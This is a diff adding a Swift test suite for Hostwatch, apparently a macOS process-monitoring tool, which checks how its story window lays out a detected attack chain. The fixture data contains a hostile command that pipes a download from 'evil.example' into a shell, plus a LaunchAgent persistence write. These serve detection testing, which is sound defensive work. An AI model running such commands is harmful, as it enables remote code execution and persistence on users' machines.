@@ -1,0 +1,50 @@
+import AppKit
+import Foundation
+import SwiftUI
+import Testing
+@testable import Hostwatch
+
+/// The story window: the chain event by event, merged with the processes' other activity.
+@MainActor @Suite struct StoryDetailsWindow {
+    static func sample() -> Story {
+        let slack = "/Applications/Slack.app/Contents/MacOS/Slack"
+        let steps = [
+            StoryStep(exec("/bin/sh", pid: 200, ppid: 100, parent: slack, args: "sh -c 'curl -s https://evil.example/p | sh'"),
+                      stage: .appShell, note: "Slack started a shell"),
+            StoryStep(exec("/usr/bin/curl", pid: 300, ppid: 200, parent: "/bin/sh", args: "curl -s https://evil.example/p"),
+                      stage: .encodedCommand, note: "download piped into a shell"),
+            StoryStep(net("/usr/bin/curl", pid: 300, to: "93.184.216.34:443", host: "evil.example"),
+                      stage: .newDomain, note: "first contact with evil.example"),
+            StoryStep(file("/bin/sh", pid: 200, "w", "\(home)/Library/LaunchAgents/com.evil.plist"),
+                      stage: .persistence, note: "wrote a LaunchAgent"),
+        ]
+        return Story(rootPid: 100, originName: "Slack", originPath: slack, origin: .app, steps: steps,
+                     firstSeen: Date().addingTimeInterval(-90), lastSeen: Date(), fired: true, severity: .dangerous)
+    }
+
+    @Test func timelineIndentsByProcessAndMergesContext() {
+        let details = StoryDetails(story: Self.sample(), historyDirectory: URL(fileURLWithPath: "/nonexistent"), live: [])
+        #expect(details.depth(200) == 0 && details.depth(300) == 1)                   // curl runs below sh
+        #expect(details.items.count == 4)
+        #expect(details.processes.map(\.name) == ["sh", "curl"])
+        #expect(StoryText.sentence(kind: .file, name: "sh", parent: "", target: "\(home)/Library/LaunchAgents/x.plist",
+                                   extra: "w", host: "") == "sh wrote ~/Library/LaunchAgents/x.plist")
+    }
+
+    /// HOSTWATCH_RENDER=<dir> writes story-window.png there (to look at the layout).
+    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"] != nil))
+    func render() throws {
+        let details = StoryDetails(story: Self.sample(), historyDirectory: URL(fileURLWithPath: "/nonexistent"), live: [])
+        let view = StoryDetailView(details: details, actions: HUDActions(openFullScreen: {}, openExclusions: {},
+                                   toggleCollector: {}, quit: {}, askAI: { _ in }), dismiss: {}, ignore: {}, scrollable: false)
+            .frame(width: 820)
+            .background(Color(nsColor: .windowBackgroundColor))
+        let renderer = ImageRenderer(content: view)
+        renderer.scale = 2
+        let image = try #require(renderer.nsImage)
+        let tiff = try #require(image.tiffRepresentation)
+        let png = try #require(NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]))
+        let dir = ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"]!
+        try png.write(to: URL(fileURLWithPath: dir).appendingPathComponent("story-window.png"))
+    }
+}
